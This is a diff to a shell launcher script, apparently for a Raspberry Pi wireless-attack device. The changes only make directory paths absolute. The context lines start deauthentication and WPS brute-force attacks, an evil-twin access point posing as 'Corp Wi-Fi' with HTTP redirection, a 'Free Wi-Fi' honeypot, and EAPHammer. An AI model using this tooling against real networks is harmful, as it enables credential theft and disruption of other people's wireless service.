@@ -30,7 +30,7 @@ led red off 2>/dev/null
 if jmp 7; then
     echo "[*] wpa auth/deauth/online_brute attack (static/dynamic)"
     monitor_enable
-    cd wpapsk
+    cd /home/pi/wpapsk
     screen -dmS wpapsk -t monitor -L -Logfile "$time-wpapsk-%n.log" ./
     monitor.sh -c 1,6,11
     #screen -r wpapsk -t deauth -X screen ./deauth.sh -b target.txt
@@ -43,14 +43,14 @@ if jmp 7; then
 
 elif jmp 11; then
     echo "[*] wps attack (static/dynamic)"
-    cd wpapsk
+    cd /home/pi/wpapsk
     screen -dmS wpapsk -t wps -L -Logfile "$time-wps-%n.log" ./wps.sh "Target Wi-Fi"
     cd -
 
 elif jmp 10; then
     echo "[*] roqueap/eviltwin attack (static)"
     #monitor_enable
-    cd eviltwin
+    cd /home/pi/eviltwin
     ifconfig wlan0 10.0.0.1/24
     iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
     screen -dmS eviltwin -t hostapd -L -Logfile "$time-eviltwin-%n.log" ./hostapd.sh "Corp Wi-Fi" ""
@@ -61,7 +61,7 @@ elif jmp 10; then
 
 elif jmp 23; then
     echo "[*] roqueap/honeypot (static)"
-    cd honeypot
+    cd /home/pi/honeypot
     ifconfig wlan0 10.0.0.1/24
     screen -dmS honeypot -t hostapd -L -Logfile "$time-honeypot-%n.log" ./hostapd.sh "Free Wi-Fi" ""
     screen -r honeypot -t dnsmasq -X screen ./dnsmasq.sh
@@ -76,7 +76,7 @@ elif lsusb | grep -q 'Nordic Semiconductor'; then
 
 elif jmp 25; then
     echo "[*] roqueap/eap (static)"
-    cd eap
+    cd /home/pi/eap
     screen -dmS eap -t hostapd-eaphammer -L -Logfile "$time-eap-%n.log" ./hostapd-eaphammer.sh "Target Wi-Fi"
     #screen -r eap -t deauth -X screen ./deauth.sh -c 1,6,11
 
